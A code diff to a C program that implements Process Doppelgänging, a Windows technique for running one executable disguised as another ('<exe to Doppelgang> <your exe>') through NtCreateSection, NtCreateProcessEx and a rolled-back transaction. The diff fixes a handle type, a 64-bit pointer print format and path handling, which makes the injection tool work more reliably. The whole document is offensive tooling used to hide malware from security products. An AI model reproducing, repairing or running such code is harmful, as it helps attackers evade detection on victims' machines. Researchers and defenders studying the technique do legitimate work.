@@ -116,13 +116,13 @@ int main(int argc,char *argv[] )
 		printf("%s <exe to Doppelgang> <your exe>",argv[0]);
 		return 0;
 	}
-	HANDLE hNtdll = GetModuleHandle("ntdll.dll");
+	HMODULE hNtdll = GetModuleHandle("ntdll.dll");
 	if (NULL==hNtdll)
 	{
 		DisplayErrorText(GetLastError());
 		return -1;
 	}
-	printf("[+] Got ntdll.dll at 0x%08x\n", hNtdll);
+	printf("[+] Got ntdll.dll at 0x%llx\n", hNtdll);
 	NtCreateSection createSection = (NtCreateSection)GetProcAddress(hNtdll, "NtCreateSection");
 	
 	if (NULL == createSection)
@@ -212,7 +212,10 @@ int main(int argc,char *argv[] )
 	HANDLE hProcess=0;
 	my_RtlInitUnicodeString initUnicodeString = (my_RtlInitUnicodeString)GetProcAddress(hNtdll, "RtlInitUnicodeString");
 	WCHAR temp[MAX_PATH] = { 0 };
-	MultiByteToWideChar(CP_UTF8, 0, argv[1], strlen(argv[1]), temp, MAX_PATH);
+	char temp2[MAX_PATH] = { 0 };
+
+	GetFullPathName(argv[1], MAX_PATH, temp2, NULL);
+	MultiByteToWideChar(CP_UTF8, 0, temp2, strlen(temp2), temp, MAX_PATH);
 	initUnicodeString(&string, temp);
 
 	ret = createProcessEx(&hProcess, GENERIC_ALL,NULL, GetCurrentProcess(), PS_INHERIT_HANDLES, hSection, NULL, NULL, FALSE);
@@ -321,7 +324,6 @@ int main(int argc,char *argv[] )
 		DisplayErrorText(GetLastError());
 		return -1;
 	}
-
 	if (FALSE == RollbackTransaction(hTransaction))
 	{
 		DisplayErrorText(GetLastError());
